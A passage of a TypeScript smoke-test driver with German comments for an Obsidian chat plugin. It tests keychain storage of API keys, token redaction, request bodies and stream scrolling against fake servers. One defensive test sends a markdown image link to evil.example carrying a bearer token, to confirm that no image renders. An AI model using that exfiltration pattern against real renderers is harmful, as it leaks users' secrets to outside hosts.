      await app.vault.createFolder(ordner).catch(() => {});
      await adapter.write(ordner + "/" + iso(1) + ".md", "- [x] a\\n- [x] b\\n");
      await adapter.write(ordner + "/" + iso(2) + ".md", "- [x] a\\n- [x] b\\n");
      p.data.settings.dailyFolder = ordner;
      await p.refreshStatus(true);
      await new Promise((r) => setTimeout(r, 500));
      return { streak: p.data.lastSnapshot.streak, seite: ${VIEW_EL}?.textContent ?? "" };
    } catch (e) {
      return { fehler: String(e) };
    } finally {
      p.data.settings.dailyFolder = alt;
      await adapter.rmdir(ordner, true).catch(() => {});
      await p.refreshStatus(true);
    }
  `);
  if ('fehler' in lauf) {
    unmeasured('streak/laufender-tag-ist-keine-luecke', lauf.fehler);
  } else {
    record(
      'streak/laufender-tag-ist-keine-luecke',
      lauf.streak === 2 && /2 DAYS/.test(lauf.seite),
      `lastSnapshot.streak = ${lauf.streak}, Seitenleiste zeigt „2 DAYS“: ${/2 DAYS/.test(lauf.seite)}`,
    );
  }

  // Das Datumsformat der Einstellung bestimmt, welche Dateinamen als Tagesnotiz zaehlen (Welle 23). Tagesnotizen heissen hier DD-MM-YYYY:
  // mit dem ISO-Format (Vorbedingung) sieht das Plugin keine Notiz, mit `DD-MM-YYYY` dieselbe Streak wie in ISO. Obsidians `moment` ist
  // nicht das npm-Paket der Unit-Tests, deshalb gehoert die Messung in die laufende Instanz.
  const format = await cdp.evaluate<{ ohne: number; mit: number; seite: string } | { fehler: string }>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    const ordner = "smoke-format";
    const alt = p.data.settings.dailyFolder, altFormat = p.data.settings.dailyDateFormat;
    const adapter = app.vault.adapter;
    const name = (back) => {
      const d = new Date(); d.setDate(d.getDate() - back);
      const pad = (n) => String(n).padStart(2, "0");
      return pad(d.getDate()) + "-" + pad(d.getMonth() + 1) + "-" + d.getFullYear();
    };
    try {
      await app.vault.createFolder(ordner).catch(() => {});
      await adapter.write(ordner + "/" + name(1) + ".md", "- [x] a\\n- [x] b\\n");
      await adapter.write(ordner + "/" + name(2) + ".md", "- [x] a\\n- [x] b\\n");
      p.data.settings.dailyFolder = ordner;
      p.data.settings.dailyDateFormat = "YYYY-MM-DD";
      await p.refreshStatus(true);
      await new Promise((r) => setTimeout(r, 400));
      const ohne = p.data.lastSnapshot.streak;
      p.data.settings.dailyDateFormat = "DD-MM-YYYY";
      await p.refreshStatus(true);
      await new Promise((r) => setTimeout(r, 500));
      return { ohne, mit: p.data.lastSnapshot.streak, seite: ${VIEW_EL}?.textContent ?? "" };
    } catch (e) {
      return { fehler: String(e) };
    } finally {
      p.data.settings.dailyFolder = alt;
      p.data.settings.dailyDateFormat = altFormat;
      await adapter.rmdir(ordner, true).catch(() => {});
      await p.refreshStatus(true);
    }
  `);
  if ('fehler' in format) {
    unmeasured('streak/datumsformat-der-einstellung-gilt', format.fehler);
  } else if (format.ohne !== 0) {
    unmeasured('streak/datumsformat-der-einstellung-gilt', `Vorbedingung verfehlt: mit ISO-Format hat das Plugin schon ${format.ohne} Tage gesehen (die DD-MM-YYYY-Namen waeren lesbar)`);
  } else {
    record(
      'streak/datumsformat-der-einstellung-gilt',
      format.mit === 2 && /2 DAYS/.test(format.seite),
      `Namen DD-MM-YYYY: Streak mit ISO-Format ${format.ohne}, mit DD-MM-YYYY ${format.mit}, Seitenleiste zeigt „2 DAYS“: ${/2 DAYS/.test(format.seite)}`,
    );
  }

  // Der Bug vom 12.08. sitzt in setControlValue (`default: return` speichert nichts) — deshalb über die Brücke.
  const bruecke = await cdp.evaluate<{ ok: boolean; wert?: unknown }>(`
    if (!app.setting) return { ok: false };
    await app.setting.open();
    await app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 500));
    const tab = app.setting.activeTab;
    if (!tab || typeof tab.setControlValue !== "function") return { ok: false };
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    const vorwert = p.data.settings.streakDaySat;
    try {
      await tab.setControlValue("streakDaySat", false);
      await new Promise((r) => setTimeout(r, 300));
      const wert = p.data.settings.streakDaySat;
      const roh = JSON.parse(await app.vault.adapter.read(app.vault.configDir + "/plugins/${PLUGIN_ID}/data.json"));
      return { ok: true, wert: [wert, roh.settings.streakDaySat] };
    } finally {
      await tab.setControlValue("streakDaySat", vorwert);
    }
  `);
  if (!bruecke.ok) {
    unmeasured('streak/arbeitstag-schalter-speichert', 'Settings-Tab bietet kein setControlValue');
  } else {
    const w = bruecke.wert as unknown[];
    record(
      'streak/arbeitstag-schalter-speichert',
      w[0] === false && w[1] === false,
      `setControlValue("streakDaySat", false) → Speicher ${JSON.stringify(w[0])}, data.json ${JSON.stringify(w[1])}`,
    );
  }
}

async function sektionManager(cdp: Cdp): Promise<void> {
  const fake = await startFakeChat();
  try {
    await installFakeManager(cdp, fake.url);
    // Die lokale Liste zeigt bewusst auf einen toten Port: würde sie befragt, käme kein Aufruf
    // am Fake-Server an.
    await setSetting(cdp, 'chatEndpoints', [{ url: 'http://127.0.0.1:9' }]);
    await setSetting(cdp, 'chatChoice', {});
    await rebuildSidebar(cdp);
    await oeffneChatTab(cdp);

    // Einstellungen: mit Manager statt des lokalen Listen-Editors der Manager-Abschnitt.
    // Modal (< 1.13) oder eigenes Fenster (≥ 1.13) — wie in sektionKontext.
    await cdp.evaluate(`
      await app.setting.open();
      await app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
      await new Promise((r) => setTimeout(r, 900));
      return true;
    `);
    const settingsText = async (): Promise<string | null> => {
      const imModal = await cdp.evaluate<string | null>(`
        const m = document.querySelector(".modal.mod-settings");
        return m ? m.textContent : null;
      `);
      if (imModal !== null && imModal.includes('Kuro')) return imModal;
      const fenster = await attachTo('settings', PORT);
      if (!fenster) return null;
      const text = await fenster.evaluate<string | null>(`return document.body ? document.body.textContent : null;`);
      fenster.close();
      return text;
    };
    const text = await settingsText();
    await schliesseEinstellungenZentral(cdp);
    const zeigtManager = text !== null && (text.includes('Endpoints come from the LLM Endpoint Manager') || text.includes('Endpunkte kommen vom LLM Endpoint Manager'));
    record(
      'manager/einstellungen-zeigen-den-manager-abschnitt',
      zeigtManager,
      text === null ? 'Einstellungen nicht lesbar' : zeigtManager ? '„Endpunkte kommen vom LLM Endpoint Manager“ sichtbar' : 'Abschnitt fehlt',
    );

    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.chatSession.reset();
      await p.askKuro("Hallo");
      return true;
    `);
    const gerendert = await pollUntil<boolean>(
      cdp,
      `return Boolean(${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md strong"));`,
      8000,
    ).catch(() => false);
    record(
      'manager/lauf-nutzt-den-manager-endpunkt',
      fake.calls() === 1,
      `${fake.calls()} Anfrage(n) am Fake-Server, obwohl die lokale Liste auf einen toten Port zeigt`,
    );
    record(
      'manager/modell-kommt-aus-defaultModel-nicht-aus-config',
      fake.lastModel() === MANAGER_DEFAULT_MODEL,
      `gesendet: ${fake.lastModel() ?? 'nichts'}`,
    );
    record(
      'manager/antwort-ist-gerendertes-markdown',
      gerendert === true,
      gerendert === true ? '<strong> im fertigen Eintrag' : 'kein <strong> im Chat nach dem Lauf',
    );

    // Manager weg → lokale Liste wie zuvor.
    await removeFakeManager(cdp);
    await setSetting(cdp, 'chatEndpoints', [{ url: fake.url }]);
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.llm.invalidate();
      p.chatSession.reset();
      await p.askKuro("Nochmal");
      return true;
    `);
    record(
      'manager/ohne-manager-laeuft-die-lokale-liste',
      fake.calls() === 2,
      `${fake.calls()} Anfragen insgesamt am Fake-Server`,
    );
  } finally {
    await removeFakeManager(cdp);
    await fake.close();
  }
}

/* ------------------------------ 14 · Verbindung (Kit 0.51.2): Schlüsselbund, Schwärzung, Neutralisierung */

const GEHEIMNIS = 'smoke-geheimnis-4711-abcdefgh';
const TOKEN = 'Bearer abcdef0123456789xyzABC';

async function sektionVerbindung(cdp: Cdp): Promise<void> {
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let fake: FakeChat | null = null;
  try {
    await removeFakeManager(cdp);
    fake = await startFakeChat({ echo: true });

    // V1 · Schlüsselbund: ein Endpunkt MIT Schlüssel, aufgelöst; danach steht kein Klartext mehr auf der Platte.
    await setSetting(cdp, 'chatEndpoints', [{ url: fake.url, apiKey: GEHEIMNIS, model: MANAGER_DEFAULT_MODEL }]);
    await setSetting(cdp, 'chatChoice', {});
    await cdp.evaluate(`await ${P}.llm.resolve({ force: true }); await new Promise((r) => setTimeout(r, 600)); return true;`);
    const platte = await cdp.evaluate<string>(`return await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json");`);
    const roh = platte.includes(GEHEIMNIS);
    const hatId = /"secretId"/.test(platte);
    record(
      'verbindung/kein-apikey-in-data-json',
      !roh && hatId,
      roh ? 'Klartext-Schlüssel steht noch in data.json' : hatId ? 'data.json trägt secretId statt apiKey' : 'weder Klartext noch secretId gefunden',
    );

    // V2 · Schwärzung und Wiederherstellung samt Bearer-Header (der Schlüssel kommt aus dem Schlüsselbund zurück).
    await cdp.evaluate(`
      ${P}.chatSession.reset();
      await ${P}.askKuro(${JSON.stringify(`bitte wiederholen: ${TOKEN}`)});
      return true;
    `);
    const gesendet = JSON.stringify(fake.lastBody() ?? {});
    record(
      'verbindung/bearer-header-aus-dem-schluesselbund',
      fake.lastAuth() === `Bearer ${GEHEIMNIS}`,
      `Authorization am Server: ${fake.lastAuth() === null ? 'fehlt' : fake.lastAuth() === `Bearer ${GEHEIMNIS}` ? 'der Schlüssel aus dem Schlüsselbund' : 'abweichend'}`,
    );
    const antwort = await pollUntil<string | null>(
      cdp,
      `const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md"); return md && md.textContent.includes("echo:") ? md.textContent : null;`,
      8000,
    ).catch(() => null);
    record(
      'verbindung/schwaerzung-platzhalter-hin-original-zurueck',
      !gesendet.includes('abcdef0123456789xyzABC') && antwort !== null && antwort.includes('abcdef0123456789xyzABC'),
      `am Server ${gesendet.includes('abcdef0123456789xyzABC') ? 'im Klartext' : 'als Platzhalter'}; im Chat ${antwort?.includes('abcdef0123456789xyzABC') === true ? 'wieder das Original' : 'nicht wiederhergestellt'}`,
    );

    // V3 · Neutralisierung am echten Renderer: Bild-URL mit Platzhalter (kommt als Original zurück) und dataviewjs.
    // Die spitzen Klammern erlauben das Leerzeichen im Token — ohne sie wäre es gar kein Bild und der Punkt nicht trennscharf.
    await cdp.evaluate(`
      ${P}.chatSession.reset();
      await ${P}.askKuro(${JSON.stringify(`![x](<https://evil.example/?d=${TOKEN}>)`)});
      return true;
    `);
    const bild = await pollUntil<{ img: number; text: string } | null>(
      cdp,
      `const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md"); return md && (md.textContent.includes("evil.example") || md.querySelector("img")) ? { img: md.querySelectorAll("img").length, text: md.textContent } : null;`,
      8000,
    ).catch(() => null);
    record(
      'verbindung/antwort-mit-bild-url-erzeugt-kein-img',
      bild !== null && bild.img === 0,
      bild === null ? 'Antwort nicht im Chat' : `${bild.img}× <img> in der gerenderten Antwort`,
    );
    const code = await cdp.evaluate<{ blocks: number; text: boolean }>(`
      ${P}.chatSession.reset();
      ${P}.chatSession.append({ role: "assistant", text: "vorher\\n\\n\`\`\`dataviewjs\\ndv.paragraph(1)\\n\`\`\`\\n\\nnachher" });
      ${P}.syncChat();
      await new Promise((r) => setTimeout(r, 800));
      const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md");
      return { blocks: md ? md.querySelectorAll(".block-language-dataviewjs, .block-language-dataview").length : -1,
               text: Boolean(md) && md.textContent.includes("dataviewjs") };
    `);
    record(
      'verbindung/dataviewjs-block-rendert-als-text',
      code.blocks === 0 && code.text,
      `${code.blocks} aktive Blöcke, Text „dataviewjs“ ${code.text ? 'sichtbar' : 'fehlt'}`,
    );
  } finally {
    await setSetting(cdp, 'chatEndpoints', []);
    await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`);
    if (fake) await fake.close();
  }
}

/* ------------------------------------- 13 · Sampling-Profile (Abschnitt „Anfrage“) */

/** Einstellungen öffnen und die Wurzel liefern, in der der Tab gezeichnet ist: Modal (< 1.13)
 *  oder eigenes Fenster (≥ 1.13). */
interface SettingsUi { cdp: Cdp; wurzel: string; eigenes: boolean }
async function oeffneEinstellungen(cdp: Cdp): Promise<SettingsUi | null> {
  await cdp.evaluate(`
    await app.setting.open();
    await app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 900));
    return true;
  `);
  const imModal = await cdp.evaluate<boolean>(`const m = document.querySelector(".modal.mod-settings"); return Boolean(m) && m.textContent.includes("Kuro");`);
  if (imModal) return { cdp, wurzel: 'document.querySelector(".modal.mod-settings")', eigenes: false };
  const fenster = await attachTo('settings', PORT);
  return fenster ? { cdp: fenster, wurzel: 'document', eigenes: true } : null;
}
async function schliesseEinstellungen(cdp: Cdp, ui: SettingsUi | null): Promise<void> {
  if (ui?.eigenes) ui.cdp.close();
  await schliesseEinstellungenZentral(cdp);
  await new Promise((r) => setTimeout(r, 200));
}

/** N-Punkte: Sampling-Profile. Gegen einen Fake-Endpunkt mit Qwen-Modellnamen (die Familie
 *  wird aus dem Namen erkannt), lokaler Pfad ohne Manager. Die Werte stehen NICHT hier, sondern
 *  an der Quelle: Temperatur 0.7 und Denken „aus“ sind die Modus-Defaults aus `code-kit`
 *  sampling-profiles (MODES.companion) — der Body-Punkt misst den tatsächlich GESENDETEN Body,
 *  nicht die Anzeige. Zwei Bearbeitungen hintereinander, weil ein Einklappen nach der ersten im
 *  Pilot nur so sichtbar wurde. */
const ANFRAGE_MODELL = 'qwen/qwen3.6-35b-a3b';

async function sektionAnfrage(cdp: Cdp): Promise<void> {
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const NAMEN = [
    'anfrage/abschnitt-klappt-auf-und-zeigt-die-felder',
    'anfrage/zwei-bearbeitungen-hintereinander-lassen-ihn-offen',
    'anfrage/body-traegt-die-modus-defaults',
    'anfrage/body-folgt-den-einstellungen',
    'anfrage/zuruecksetzen-entfernt-die-ueberschreibung',
    'anfrage/letzte-anfrage-steht-beim-oeffnen-da',
  ];
  let fake: FakeChat | null = null;
  let ui: SettingsUi | null = null;
  try {
    await removeFakeManager(cdp);
    fake = await startFakeChat();
    await setSetting(cdp, 'chatEndpoints', [{ url: fake.url, model: ANFRAGE_MODELL }]);
    await setSetting(cdp, 'chatChoice', {});
    await setSetting(cdp, 'request', { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false });
    const frage = async (): Promise<void> => {
      await cdp.evaluate(`${P}.llm.invalidate(); ${P}.chatSession.reset(); await ${P}.askKuro("Hallo"); return true;`);
    };

    // Body mit Modus-Defaults.
    await frage();
    const body1 = fake.lastBody();
    record(NAMEN[2]!, body1?.temperature === 0.7 && body1?.reasoning_effort === 'none' && body1?.max_tokens === 1024 && body1?.model === ANFRAGE_MODELL,
      `Body: temperature=${JSON.stringify(body1?.temperature)}, reasoning_effort=${JSON.stringify(body1?.reasoning_effort)}, max_tokens=${JSON.stringify(body1?.max_tokens)}, Modell ${JSON.stringify(body1?.model)}`);

    // Aufklappen.
    ui = await oeffneEinstellungen(cdp);
    if (!ui) { for (const n of NAMEN.filter((_, i) => i !== 2)) unmeasured(n, 'Einstellungs-Oberfläche nicht gefunden'); return; }
    const w = ui.wurzel;
    const vorKlick = await ui.cdp.evaluate<string | null>(`return (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded") ?? null;`);
    await ui.cdp.evaluate(`(${w}).querySelector(".okit-collapsible-header")?.click(); return true;`);
    const felder = await pollUntil<number>(ui.cdp, `const n = (${w}).querySelectorAll('.okit-collapsible-body input[data-field]').length; return n > 0 ? n : null;`, 4000, 200);
    const nachKlick = await ui.cdp.evaluate<string | null>(`return (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded") ?? null;`);
    record(NAMEN[0]!, vorKlick === 'false' && nachKlick === 'true' && (felder ?? 0) >= 2,
      `aria-expanded ${String(vorKlick)} → ${String(nachKlick)}, ${String(felder)} Eingabefelder`);

    const letzte = await ui.cdp.evaluate<string>(`return (${w}).querySelector(".okit-request-last")?.textContent ?? "";`);
    record(NAMEN[5]!, letzte.includes('"temperature": 0.7') && letzte.includes('"reasoning_effort": "none"'),
      letzte ? `Anzeige: ${letzte.replace(/\s+/g, ' ').slice(0, 120)}` : 'kein .okit-request-last im Tab');

    // Bearbeitung 1: Temperatur 0.9; Bearbeitung 2: Denkstufe medium.
    await ui.cdp.evaluate(`
      const i = (${w}).querySelector('input[data-field="temperature"]');
      i.value = "0.9"; i.dispatchEvent(new Event("input", { bubbles: true })); i.dispatchEvent(new Event("blur"));
      return true;`);
    const ov = await pollUntil<boolean>(cdp, `return ${P}.data.settings.request.overrides?.companion?.["qwen3.6"]?.temperature === 0.9 ? true : null;`, 4000, 200);
    const offen1 = await pollUntil<string>(ui.cdp, `const a = (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    await ui.cdp.evaluate(`
      const sel = [...(${w}).querySelectorAll(".okit-collapsible-body select")].find((s) => [...s.options].some((o) => o.value === "medium"));
      sel.value = "medium"; sel.dispatchEvent(new Event("change", { bubbles: true }));
      return true;`);
    const stufe = await pollUntil<boolean>(cdp, `return ${P}.data.settings.request.thinking?.companion === "medium" ? true : null;`, 4000, 200);
    const offen2 = await pollUntil<string>(ui.cdp, `const a = (${w}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    record(NAMEN[1]!, ov === true && offen1 === 'true' && stufe === true && offen2 === 'true',
      `Überschreibung ${ov ? 'gespeichert' : 'fehlt'}, Stufe ${stufe ? 'medium' : 'nicht gesetzt'}, Abschnitt nach Bearbeitung 1: ${String(offen1 ?? 'zu')}, nach 2: ${String(offen2 ?? 'zu')}`);
    await schliesseEinstellungen(cdp, ui);
    ui = null;

    // Zweiter Lauf: der Body folgt den Einstellungen.
    await frage();
    const body2 = fake.lastBody();
    record(NAMEN[3]!, body2?.temperature === 0.9 && body2?.reasoning_effort === 'medium',
      `Body: temperature=${JSON.stringify(body2?.temperature)}, reasoning_effort=${JSON.stringify(body2?.reasoning_effort)}`);

    // Zurücksetzen der Temperatur über den Knopf der Zeile.
    ui = await oeffneEinstellungen(cdp);
    if (!ui) { unmeasured(NAMEN[4]!, 'Einstellungs-Oberfläche nicht gefunden'); return; }
    const w2 = ui.wurzel;
    await ui.cdp.evaluate(`
      const zeile = (${w2}).querySelector('input[data-field="temperature"]')?.closest(".setting-item");
      zeile?.querySelector(".extra-setting-button")?.click();
      return true;`);
    const weg = await pollUntil<boolean>(cdp, `return ${P}.data.settings.request.overrides?.companion?.["qwen3.6"]?.temperature === undefined ? true : null;`, 4000, 200);
    const offen3 = await pollUntil<string>(ui.cdp, `const a = (${w2}).querySelector(".okit-collapsible-header")?.getAttribute("aria-expanded"); return a === "true" ? a : null;`, 2000, 200);
    record(NAMEN[4]!, weg === true && offen3 === 'true', `Überschreibung ${weg ? 'entfernt' : 'noch da'}, Abschnitt ${offen3 === 'true' ? 'offen' : 'zugeklappt'}`);
  } catch (e) {
    for (const n of NAMEN) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (ui) await schliesseEinstellungen(cdp, ui);
    if (fake) await fake.close().catch(() => undefined);
  }
}

/* ------------------------------------- 16 · Folge-Regel (Stream-Bereich, zentraler Stub) */

/** Token-ähnlich: kleine Stücke in kurzem Takt (ein Absatz je Stück wäre kein Strom, sondern ein Sprung über die Folge-Schwelle).
 *  Der Strom ist lang genug für drei Phasen (Kontrolle, Störung, Wiederaufnahme): `messeFolge` aus der Brücke braucht je Phase mindestens drei Stände. */
const FOLGE_TAKT = 30;
const FOLGE_LAENGE = 10;
const FOLGE_ABSAETZE = 50;
/** Der Log-Körper der laufenden Antwort entsteht mit dem Strom: vorher liefert der Ausdruck nichts, damit die Messung nicht einen Vorgänger festhält und den Wechsel als Neuaufbau wertet. */
const FOLGE_LOG = `(() => { const l = ${VIEW_EL}?.querySelector(".kuro-chat-log"); return l && l.querySelector(".okit-stream-block") ? l : null; })()`;

/** Startet eine Antwort im Chat (der Strom läuft im Renderer weiter) und wartet nicht. `window.__smokeFolge.fertig` zeigt das Ende. */
async function starteFolgeStrom(cdp: Cdp): Promise<void> {
  const gegenprobe = parseArgs(process.argv.slice(2)).has('folge-gegenprobe');
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  await cdp.evaluate(`
    window.__smokeFolge = { fertig: false };
    ${gegenprobe ? `// Gegenprobe (--folge-gegenprobe): ein Plugin, das ein Hochscrollen überschreibt. Genau der Folge-Punkt muss rot werden.
    new MutationObserver(() => { const l = ${VIEW_EL}?.querySelector(".kuro-chat-log"); if (l) l.scrollTop = l.scrollHeight; }).observe(document.body, { childList: true, subtree: true, characterData: true });` : ''}
    ${P}.askKuro("Erzähl lang.").finally(() => { window.__smokeFolge.fertig = true; });
    return true;
  `);
}

/** Verlauf leeren, BEVOR der Beobachter der Messung hängt: der Reset baut den Log-Körper neu, und `messeFolge` wertet einen
 *  ausgetauschten Scroll-Container als Neuaufbau („nichts gemessen“). */
async function leereVerlauf(cdp: Cdp): Promise<void> {
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  await cdp.evaluate(`${P}.chatSession.reset(); await new Promise((r) => setTimeout(r, 300)); return true;`);
}

/** Den Strom zu Ende laufen lassen, bevor der nächste Lauf den Verlauf leert (nach einem Abbruch wartet es nicht). */
async function warteFolgeStromEnde(cdp: Cdp): Promise<void> {
  if (istAbgebrochen()) return;
  await pollUntil<boolean>(cdp, `return window.__smokeFolge?.fertig === true ? true : null;`, 15000).catch(() => false);
}

async function sektionFolgeRegel(cdp: Cdp): Promise<void> {
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const NAMEN = {
    folge: 'stream/folge-regel-respektiert-hochscrollen',
    kontrolle: 'stream/folgt-ohne-stoerung',
    wiederaufnahme: 'stream/folgt-wieder-nach-dem-zurueckscrollen',
    absatz: 'stream/folgt-ohne-stoerung-bei-absatzgrossen-stuecken',
  } as const;
  const alle = Object.values(NAMEN);
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  try {
    await removeFakeManager(cdp);
    const absaetze = Array.from({ length: FOLGE_ABSAETZE }, (_, i) => `Absatz ${i + 1}: Dies ist ein längerer Satz, der über mehrere Zeilen läuft und den Verlauf wachsen lässt. Noch ein Satz dazu.\n\n`);
    // Der Stub hält den Strom nach dem letzten Stück noch länger als drei Takte offen: eine Messung am Ende zählt nicht.
    stub = await startLlmStub({ models: [MANAGER_DEFAULT_MODEL], takt: FOLGE_TAKT, laenge: FOLGE_LAENGE, nachlaufMs: 750, standard: { text: absaetze.join('') } });
    const s = stub;
    await setSetting(cdp, 'chatEndpoints', [{ url: s.url, model: MANAGER_DEFAULT_MODEL }]);
    await setSetting(cdp, 'chatChoice', {});
    await cdp.evaluate(`${P}.llm.invalidate(); return true;`);
    await rebuildSidebar(cdp);
    await oeffneChatTab(cdp);

    // Token-kleine Stücke: Kontrolle, Störung und Wiederaufnahme in EINEM Strom. Die zentrale Messung (README der Brücke § Folge-Messung)
    // trägt die festgelegten Werte (Überlauf ≥ 80 px, ≥ 3 Stände, Abstand ≤ 24 px, Toleranz 4 px); der Treiber legt keinen eigenen fest.
    await leereVerlauf(cdp);
    const token = await messeFolge(cdp, {
      ausdruck: FOLGE_LOG,
      laeuft: () => s.zaehler().unterwegs > 0,
      starte: () => starteFolgeStrom(cdp),
      wiederaufnahme: true,
    });
    zeichneFolge({ record, unmeasured }, { kontrolle: NAMEN.kontrolle, folge: NAMEN.folge, wiederaufnahme: NAMEN.wiederaufnahme }, token);
    await warteFolgeStromEnde(cdp);

    // Grobe Stücke: ein Stück = ein ganzer Absatz (mehrere Zeilen). Wächst der Inhalt in EINEM Schritt über die
    // Folge-Schwelle, darf das Folgen nicht aufhören (Kit-Fehler vor 0.59.0: `atBottom` wurde erst nach dem Wachsen gemessen).
    s.konfiguriere({ takt: 250, standard: { stuecke: absaetze } });
    await leereVerlauf(cdp);
    const grob = await messeFolge(cdp, {
      ausdruck: FOLGE_LOG,
      laeuft: () => s.zaehler().unterwegs > 0,
      starte: () => starteFolgeStrom(cdp),
      stoerung: false,
    });
    zeichneFolge({ record, unmeasured }, { kontrolle: NAMEN.absatz }, grob);
    await warteFolgeStromEnde(cdp);
  } catch (e) {
    if (istAbgebrochen()) throw e;
    for (const n of alle) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (!istAbgebrochen()) {
      await setSetting(cdp, 'chatEndpoints', []);
      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`);
    }
    if (stub) await stub.stop().catch(() => undefined);
  }
}

/** Gemma 4 auf LM Studio schreibt sein Denken OHNE Öffner in den Inhalt und beendet es mit `<channel|>`; die Antwort folgt. Der Stub streamt
 *  genau das (Modellname wie Gemma: der Kit-Client erkennt das Kanalformat am Namen). Gemessen wird die laufende Antwortzeile MITTEN im
 *  Strom (am Ende setzt das Ergebnis den Text neu) und die fertige Antwort. Kuro zeigt kein Denken an (kein `onReasoning`): der Denktext
 *  darf nirgends in der Antwort stehen. */
async function sektionGemma(cdp: Cdp): Promise<void> {
  const NAME = 'stream/gemma-denken-nicht-in-der-antwort';
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const GEDANKE = 'Ich wäge erst die Quellen ab und prüfe dann den Kontext.';
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  try {
    await removeFakeManager(cdp);
    stub = await startLlmStub({ models: ['google/gemma-4-e4b'], takt: 700, standard: { stuecke: [GEDANKE.slice(0, 20), `${GEDANKE.slice(20)}<channel|>`, 'Die fertige ', 'Antwort.'] } });
    await setSetting(cdp, 'chatEndpoints', [{ url: stub.url, model: 'google/gemma-4-e4b' }]);
    await setSetting(cdp, 'chatChoice', {});
    await cdp.evaluate(`${P}.llm.invalidate(); return true;`);
    await rebuildSidebar(cdp);
    await oeffneChatTab(cdp);
    await leereVerlauf(cdp);
    await cdp.evaluate(`window.__smokeGemma = { fertig: false }; ${P}.askKuro("Gemma-Frage").finally(() => { window.__smokeGemma.fertig = true; }); return true;`);
    const mid = await pollUntil<string>(
      cdp,
      `const t = ${VIEW_EL}?.querySelector(".kuro-chat-stream-content")?.textContent ?? ""; return t.includes("Die fertige") && !t.includes("Antwort.") ? t : null;`,
      20_000,
      50,
    );
    const shotDir = process.env.SMOKE_SHOT_DIR;
    if (shotDir && mid !== null) {
      const { boxOf, capture } = await import('../../tools/obsidian-cdp/shot.js');
      const box = await boxOf(cdp, `.kuro-chat-log`, 12);
      if (box) { mkdirSync(shotDir, { recursive: true }); writeFileSync(join(shotDir, 'gemma-antwort.png'), await capture(cdp, box, 2)); }
    }
    await pollUntil<boolean>(cdp, `return window.__smokeGemma?.fertig === true ? true : null;`, 20_000).catch(() => false);
    const ende = await cdp.evaluate<string>(`return (${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md")?.textContent ?? "").trim();`);
    record(
      NAME,
      mid !== null && !mid.includes('wäge') && !mid.includes('channel') && ende === 'Die fertige Antwort.',
      `mitten im Strom „${(mid ?? '').slice(0, 50)}“ · fertige Antwort „${ende.slice(0, 60)}“ (Stub, Modellname google/gemma-4-e4b)`,
    );
  } catch (e) {
    if (istAbgebrochen()) throw e;
    if (!aufgezeichnet(NAME)) unmeasured(NAME, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (!istAbgebrochen()) {
      await setSetting(cdp, 'chatEndpoints', []);
      await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`);
    }
    if (stub) await stub.stop().catch(() => undefined);
  }
}

/** Punkt „Denkblock kopierbar“ (Brücke `messeDenkblockKopierbar`, Kopier-Knopf des Kit-Blocks seit obsidian-kit 0.63.0). Voraussetzung ist ein Denkblock im
 *  DOM: der Stub liefert Reasoning-Deltas und hält den Strom offen. Kuro zeigt heute kein Denken an (kein `onReasoning`); der Treiber MISST das, statt es
 *  anzunehmen. Erscheint ein Block, gelten die zwei Prüfpunkte der Brücke (Kopie, Gegenprobe); erscheint keiner, steht der Opt-out samt gemessenem Grund in der
 *  Bilanz (`optOutPflicht`: nicht anwendbar, nicht grün). Baut Kuro das Denken einmal ein, wird aus dem Opt-out von selbst eine Messung. */
async function sektionDenkblock(cdp: Cdp): Promise<void> {
  const NAMEN = { kopie: 'stream/denkblock-kopierbar', gegen: 'stream/denkblock-gegenprobe' };
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const bil = { record: (n: string, ok: boolean, d?: string) => record(n, ok, d ?? ''), unmeasured: (n: string, w: string) => unmeasured(n, w), skipped: (n: string, w: string) => skipped(n, w) };
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  try {
    await removeFakeManager(cdp);
    // Das Denken kommt VOR dem Inhalt; `nachlaufMs` hält den Strom nach dem letzten Stück offen, solange gemessen wird.
    stub = await startLlmStub({
      models: [MANAGER_DEFAULT_MODEL],
      takt: 250,
